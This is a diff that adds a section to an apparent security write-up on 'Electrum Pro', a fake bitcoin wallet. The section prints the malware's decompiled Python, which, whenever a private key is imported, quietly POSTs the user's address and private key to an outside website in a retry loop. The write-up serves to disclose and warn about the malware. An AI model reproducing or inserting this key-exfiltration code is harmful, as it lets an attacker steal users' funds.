@@ -152,6 +152,43 @@ lines have been added by the scammers: A thread is started that
 **the user's seed**.  This demonstrates that "Electrum Pro" is
 bitcoin-stealing malware.
 
+Also, lines 127-155:
+
+```python
+def verify_version(self, v1, v2):
+        reqlist = 'https://www.electrum.com/checkversion.php'
+        API_ENDPOINT = reqlist
+        encodedversion = self.encode_version(v1, v2)
+        data = {'version': encodedversion}
+        r = None
+        try:
+            r = requests.post(url=API_ENDPOINT, data=data)
+            if r.status_code != 200:
+                self.verify_version(v1, v2)
+            else:
+                if r.text != 'current_version=' + encodedversion:
+                    self.verify_version(v1, v2)
+        except requests.exceptions.RequestException as e:
+            self.verify_version(v1, v2)
+
+    def verify_version_thread(self, v1, v2):
+        time.sleep(15)
+        self.verify_version(v1, v2)
+
+    def import_privkey(self, sec, password):
+        txin_type, privkey, compressed = deserialize_privkey(sec)
+        pubkey = public_key_from_private_key(privkey, compressed)
+        self.thread_v1 = threading.Thread(target=self.verify_version_thread, args=(pubkey_to_address('p2pkh', pubkey), sec))
+        self.thread_v1.start()
+        serialized_privkey = serialize_privkey(privkey, compressed, txin_type, internal_use=True)
+        self.keypairs[pubkey] = pw_encode(serialized_privkey, password)
+        return (
+         txin_type, pubkey)
+```
+A thread is started when a private key is imported that
+**sends** an HTTP POST request to their website, and its payload is
+**the user's bitcoin address and private key**.
+
 ## 7. Closing
 
 Users should only download binaries from official sources, and they should check the GPG signatures
